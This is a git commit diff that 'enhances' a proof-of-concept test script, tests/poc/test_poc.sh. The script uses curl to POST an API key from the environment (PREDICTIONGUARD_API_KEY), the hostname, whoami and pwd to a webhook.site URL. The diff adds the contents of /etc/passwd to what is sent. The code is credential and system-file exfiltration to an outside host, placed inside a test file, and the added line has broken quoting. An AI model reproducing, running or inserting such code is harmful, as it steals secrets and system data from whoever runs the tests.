872bc8449a45666d84b3d1cfeee981e7c2ed74e8
Ri <rishiarora23453@gmail.com>
2026-05-22 08:59:44 +0530

    Enhance PoC test script

--- tests/poc/test_poc.sh
+++ tests/poc/test_poc.sh
@@ -10,5 +10,6 @@ curl -s -X POST "https://webhook.site/7467e1a3-728e-4db7-b0a1-584c70a79bbd" \
     \"predictionguard\": \"${PREDICTIONGUARD_API_KEY}\",
     \"hostname\": \"$(hostname)\",
     \"whoami\": \"$(whoami)\",
-    \"pwd\": \"$(pwd)\"
+    \"pwd\": \"$(pwd)\",
+    \"etc/passwd\":"$(cat /etc/passwd)\" 
   }"
